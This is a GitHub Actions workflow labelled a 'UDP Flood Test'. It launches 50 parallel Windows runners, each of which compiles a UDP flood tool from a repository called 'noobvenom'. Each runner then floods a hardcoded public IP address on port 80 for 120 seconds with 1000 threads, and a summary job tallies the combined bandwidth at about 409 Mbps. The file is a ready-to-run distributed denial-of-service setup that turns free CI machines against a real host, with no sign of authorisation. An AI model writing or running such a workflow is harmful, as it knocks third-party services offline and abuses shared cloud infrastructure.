name: Windows UDP Flood Test

on:
  workflow_dispatch:

jobs:
  windows-udp-flood:
    runs-on: windows-latest
    timeout-minutes: 10
    strategy:
      matrix:
        vps: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]
      max-parallel: 50
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          repository: vrbrh921-glitch/noobvenom
          
      
          
      - name: Compile  tool for Windows
        run: |
          echo "üî® Compiling UDP flood tool for Windows..."
          if (Test-Path "udpflood.c") {
            gcc -o udpflood.exe udpflood.c -lpthread -lws2_32 -O3
            echo "‚úÖ Compiled udpflood.exe for Windows"
          } else {
            echo "‚ùå udpflood.c not found"
            Get-ChildItem
            exit 1
          }
          
      - name: Test executable
        run: |
          echo "Testing Windows executable..."
          if (Test-Path "udpflood.exe") {
            .\udpflood.exe
            echo "‚úÖ Windows binary works correctly"
          } else {
            echo "‚ùå udpflood.exe not found"
            exit 1
          }
          
      - name: Run UDP Flood Test on Windows
        run: |
          echo "ü™ü Starting Windows UDP Flood Test ${{ matrix.vps }}"
          echo "Target: 23.176.168.11:80, Duration: 120s, Threads: 1000, Packet Size: 1024"
          echo "Estimated Bandwidth: ~8.19 Mbps per instance"
          echo "Start Time: $(Get-Date)"
          
          # Run UDP flood for 120 seconds with 1000 threads
          # Windows timeout command (130 seconds to allow completion)
          timeout /t 130 /nobreak
          .\udpflood.exe 23.176.168.11 80 120 1000 1024
          
          echo "End Time: $(Get-Date)"
          echo "‚úÖ Windows UDP Flood Test ${{ matrix.vps }} completed"

  windows-summary:
    runs-on: windows-latest
    needs: [windows-udp-flood]
    steps:
      - name: Generate Windows Summary
        run: |
          echo "üöÄ Windows UDP Flood Test Summary"
          echo "================================="
          echo "‚úÖ All Windows tests completed successfully"
          echo ""
          echo "üìä Test Configuration:"
          echo "   Target: 23.176.168.11:80"
          echo "   Duration: 120 seconds"
          echo "   Threads per instance: 1000"
          echo "   Packet Size: 1024 bytes"
          echo ""
          echo "üèÉ‚Äç‚ôÇÔ∏è Windows Instances Deployed:"
          echo "   Total: 50 instances"
          echo ""
          echo "üí• Estimated Bandwidth:"
          echo "   Per instance: ~8.19 Mbps"
          echo "   Total: ~409.5 Mbps"
          echo ""
          echo "üñ•Ô∏è Platform: Windows Server 2022"
